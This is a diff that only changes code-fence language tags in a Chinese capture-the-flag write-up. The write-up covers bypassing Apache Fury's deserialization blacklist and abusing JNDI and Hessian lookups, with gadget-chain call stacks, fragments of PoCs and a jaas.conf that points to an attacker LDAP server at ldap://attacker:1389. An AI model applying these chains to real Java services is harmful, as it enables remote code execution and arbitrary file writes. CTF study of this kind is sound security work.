@@ -18,7 +18,7 @@ tocOpen: true
 
 话不多说，直接看题，题目使用 Apache Fury 进行反序列化，配置如下：
 
-```Java
+```java
 Fury fury = Fury.builder()
     .withLanguage(Language.JAVA)
     .requireClassRegistration(false)  // 允许反序列化未注册类
@@ -32,7 +32,7 @@ Fury 通过 `fury/disallowed.txt` 维护一份类黑名单，在反序列化时�
 
 黑名单检查逻辑（`DisallowedList.java`）：
 
-```Java
+```java
 static void checkNotInDisallowedList(String clsName) {
     if (DEFAULT_DISALLOWED_LIST_SET.contains(clsName)) {
         throw new InsecureException(String.format("%s hit disallowed list", clsName));
@@ -72,7 +72,7 @@ static void checkNotInDisallowedList(String clsName) {
 
 就在一筹莫展之际，猛地想起老大梅子酒在 Non-RCE 题解中提到的 `StoreableCachingMap` 链子。这条链子能实现任意路径写文件，幸运地避开了黑名单的拦截！
 
-```Java
+```text
 HashSet.readObject()
     HashMap.put()
         HashMap.hash()
@@ -88,7 +88,7 @@ HashSet.readObject()
 
 适配 Fury 的完整 PoC 如下：
 
-```Java
+```java
 package reproduce;
 
 import org.apache.commons.collections.comparators.TransformingComparator;
@@ -176,7 +176,7 @@ public class ExpAspectJ {
 
 利用链触发流程：
 
-```Plain
+```text
 PriorityQueue.readObject()
   → heapify()
   → siftDown()
@@ -202,7 +202,7 @@ PriorityQueue.readObject()
 
 通过监控类加载情况，`dnsns.jar` 没有被加载！
 
-```Prolog
+```text
 2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$AbortPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
 2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$CallerRunsPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
 2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$DiscardOldestPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
@@ -227,7 +227,7 @@ PriorityQueue.readObject()
 
 这意味着可以通过反序列化 `sun.net.spi.nameservice.dns.DNSNameServiceDescriptor` 触发 `dnsns.jar` 加载。这一记回马枪，让死局复活。
 
-```Java
+```java
 package reproduce;
 
 import org.apache.fury.Fury;
@@ -293,7 +293,7 @@ public class ExpDNS {
 
 题目提供了一个 Spring Boot 应用，核心在于 `Web.java` 提供了一个 HTTP 接口，该接口接受一个 `X-Lookup-URL` 头，并对其进行 JNDI `lookup`。
 
-```Java
+```java
 // Web.java
 String url = exchange.getRequestHeaders().getFirst("X-Lookup-URL");
 new InitialContext().lookup(url);
@@ -309,7 +309,7 @@ new InitialContext().lookup(url);
 
 当 JNDI 进行 `getObjectInstance` 时，返回的是一个 Hessian 代理对象。如果后续对这个代理对象调用了方法，就会触发 Hessian 反序列化请求。
 
-```Java
+```java
 // HessianProxyFactory.java
 public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
     Reference ref = (Reference)obj;
@@ -354,7 +354,7 @@ public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtabl
 
 完整 PoC 如下，Hessian 序列化数据必须采用 2.0 RPC Reply 格式：
 
-```Java
+```java
 package org.example;
 
 import com.caucho.hessian.io.Hessian2Output;
@@ -455,7 +455,7 @@ public class ExploitGenerator {
 
 难道这就陷入到僵局了嘛，Bro😭😭😭
 
-```Java
+```java
 LookupRef ref = new LookupRef("java.lang.String","look");
 ref.add(new StringRefAddr("factory", "com.caucho.hessian.client.HessianProxyFactory"));
 //com.caucho.burlap.client.BurlapProxyFactory
@@ -570,7 +570,7 @@ public Object getObjectInstance(Object obj, Name name, Context nameCtx,
 
 搭建 HTTP 服务器，提供 `jaas.conf`：
 
-```Plain
+```text
 Client {
    com.sun.security.auth.module.JndiLoginModule required
    user.provider.url="ldap://attacker:1389/Hessian/Exploit"
